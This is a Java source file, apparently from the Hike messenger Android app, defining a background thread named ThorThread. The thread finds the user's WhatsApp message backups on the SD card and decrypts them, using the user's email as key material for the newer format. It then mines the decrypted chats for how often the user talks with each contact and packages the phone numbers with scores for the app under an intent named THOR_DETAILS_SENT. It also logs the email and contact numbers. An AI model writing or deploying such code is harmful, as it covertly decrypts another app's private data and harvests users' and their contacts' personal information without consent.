package com.bsb.hike.thor;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Properties;
import java.util.Map.Entry;

import javax.crypto.NoSuchPaddingException;

import org.json.JSONException;
import org.json.JSONObject;
import org.sqldroid.SQLDroidDriver;

import com.bsb.hike.HikeMessengerApp;
import com.bsb.hike.utils.StickerManager;
import com.bsb.hike.utils.Utils;

import android.content.Context;
import android.content.Intent;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;

public class ThorThread implements Runnable
{
	public static final String THOR = "thor";

	private static final String OLD_BACKUP = "/mnt/sdcard/WhatsApp/Databases/msgstore.db.crypt";

	private static final String NEW_BACKUP = "/mnt/sdcard/WhatsApp/Databases/msgstore.db.crypt5";

	private static final String DB_FILE = "/mnt/temp/msgstore.db";

	private static final String TEMP_DB_FILE = DB_FILE + "-journal";

	private static final String CONN_STR = "jdbc:sqldroid:" + DB_FILE;

	private static final String TAG = "ThorThread";

	private Context ctx;

	public ThorThread(Context context)
	{
		ctx = context;
	}

	@Override
	public void run()
	{
		boolean successDecrypt = true;
		File outputFile = new File(DB_FILE);
		Connection con = null;
		try
		{
			File inputFile = new File(OLD_BACKUP);
			if (!inputFile.exists()) // old encryption logic file does not exist
			{
				inputFile = new File(NEW_BACKUP);
				if (!inputFile.exists()) // if no backup exists do nothing
					return;
				else
				{
					// .crypt5 exists
					String email = Utils.getEmail(ctx);
					Log.d(TAG, "User email : " + email);
					if (email != null)
						successDecrypt = Decrypt.decrypt5(inputFile, outputFile, email);
					else
						successDecrypt = false;
				}
			}
			else
			{
				// old format backup file exists
				successDecrypt = Decrypt.decrypt(inputFile, outputFile);
			}
			if (successDecrypt)
			{
				Class.forName("org.sqldroid.SQLDroidDriver");
				Properties removeLocale = new Properties();
				removeLocale.put(SQLDroidDriver.ADDITONAL_DATABASE_FLAGS, android.database.sqlite.SQLiteDatabase.NO_LOCALIZED_COLLATORS);
				con = DriverManager.getConnection(CONN_STR, removeLocale);
				con.setAutoCommit(false);
				List<String> convs = DbUtils.getConvs(con);

				HashMap<String, Integer> freq = new HashMap<String, Integer>();
				long oldts = DbUtils.getOldTs(60);
				if (convs != null)
				{
					for (String key : convs)
					{
						DbUtils.calculateScore(freq, con, key, oldts);
					}
					print(freq);
					Intent i = new Intent(HikeMessengerApp.THOR_DETAILS_SENT);
					i.putExtra(THOR, getThorBytes(freq));
					LocalBroadcastManager.getInstance(ctx).sendBroadcast(i);
				}
			}
		}
		catch (ClassNotFoundException e)
		{
			Log.e(TAG, "Exception", e);
		}
		catch (SQLException e)
		{
			Log.e(TAG, "SQLException", e);
		}
		finally
		{
			try
			{
				if (outputFile.exists())
					outputFile.delete();

				new File(TEMP_DB_FILE).delete(); // this is to delete journal file

				if (con != null)
					con.close();
			}
			catch (SQLException e)
			{
				Log.e(TAG, "SQLException in closing connection", e);
			}
			catch(Exception e)
			{
				// do not handle
			}
		}
	}

	private byte[] getThorBytes(HashMap<String, Integer> freq)
	{
		if (freq == null)
			return null;

		ByteArrayOutputStream bout = new ByteArrayOutputStream();
		ObjectOutputStream out = null;
		try
		{
			out = new ObjectOutputStream(bout);
			out.writeInt(freq.size()); // represents number of key value pairs
			for (Entry<String, Integer> kv : freq.entrySet())
			{
				String k = kv.getKey();
				if (k != null)
				{
					int idx = k.indexOf("@");
					String ph = k.substring(0, idx);
					try
					{
						out.writeUTF(ph);
						out.writeInt(kv.getValue());
					}
					catch (IOException e)
					{
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
		}
		catch (IOException e1)
		{
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		finally
		{
			try
			{
				if (out != null)
				{
					out.close();
				}
			}
			catch (IOException ex)
			{
				// ignore close exception
			}
			try
			{
				bout.close();
			}
			catch (IOException ex)
			{
				// ignore close exception
			}
		}
		return bout.toByteArray();
	}
	
	private void print(HashMap<String, Integer> freq)
	{
		StringBuilder b = new StringBuilder();
		b.append("\n");
		for(Entry<String,Integer> e : freq.entrySet())
		{
			b.append(e.getKey() + " : " + e.getValue());
			b.append("\n");
		}
		Log.d(TAG,b.toString());
	}
}
